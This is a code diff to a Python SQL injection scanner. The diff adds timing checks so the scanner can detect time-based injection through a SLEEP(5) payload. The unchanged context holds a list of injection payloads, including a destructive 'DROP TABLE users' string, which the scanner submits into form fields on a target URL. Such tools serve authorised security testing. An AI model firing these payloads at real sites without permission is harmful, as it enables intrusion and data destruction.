@@ -15,7 +15,7 @@ sql_payloads = [
     r"' AND 1=1 --",
     r"' AND 1=2 --",
     r"' OR 1=1#",
-    r"' OR SLEEP(5) --",
+    r"' OR SLEEP(5) --",  # Time-based payload
     r"' OR 1=1/*",
     r"'; DROP TABLE users --",
     r'" OR "a"="a" --',
@@ -77,16 +77,30 @@ def test_form(url, form, method, headers=None):
         for key in data.keys():
             data[key] = payload
             print(f"Testing with payload: {payload}")
+
+            start_time = time.time()
             if method == 'post':
                 response = send_request(action_url, data=data, headers=headers)
             else:
                 response = send_request(action_url + "?" + "&".join([f"{k}={v}" for k, v in data.items()]), headers=headers)
+            response_time = time.time() - start_time
 
             if response and response.status_code == 200:
+                # Check for SQL error signatures
                 for error_signature in sql_error_signatures:
                     if error_signature in response.text.lower():
                         print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
                         return True
+
+                # Time-based SQL Injection detection (e.g., SLEEP(5))
+                if 'SLEEP' in payload and response_time > 4:
+                    print(f"[!] Time-based SQL Injection vulnerability detected with payload: {payload}")
+                    return True
+
+                # Optionally, you can check for changes in page content
+                # Example: if you detect content changes, it could indicate SQLi
+                # You can extend this part further based on your application logic.
+
             time.sleep(0.5)  # To avoid overwhelming the server
     return False
 
